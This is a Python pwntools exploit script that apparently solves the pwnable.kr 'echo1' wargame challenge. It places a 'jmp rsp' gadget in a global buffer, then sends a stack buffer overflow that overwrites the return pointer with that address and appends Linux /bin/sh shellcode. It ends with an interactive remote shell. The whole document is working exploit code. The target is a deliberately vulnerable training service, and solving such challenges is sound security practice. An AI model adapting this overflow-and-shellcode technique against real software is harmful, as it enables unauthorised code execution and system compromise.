from pwn import *

context(os="linux", arch="amd64")


class Echo1Exploit(object):

    BUFFER_OVERFLOW_OFFSET_FROM_RETURN_POINTER = 0x28
    ID_ADDRESS = 0x6020A0

    def __init__(self) -> None:
        self.shell = remote('pwnable.kr', 9010)

    def run(self):
        print(self.shell.recv())
        self.shell.sendline(asm("jmp rsp"))
        print(self.shell.recv())
        print(self.shell.recv())
        self.shell.sendline("1")
        print(self.shell.recv())
        self.shell.sendline(b"A" * self.BUFFER_OVERFLOW_OFFSET_FROM_RETURN_POINTER + p64(self.ID_ADDRESS) + asm(shellcraft.amd64.linux.sh()))
        self.shell.interactive()


if __name__ == '__main__':
    Echo1Exploit().run()
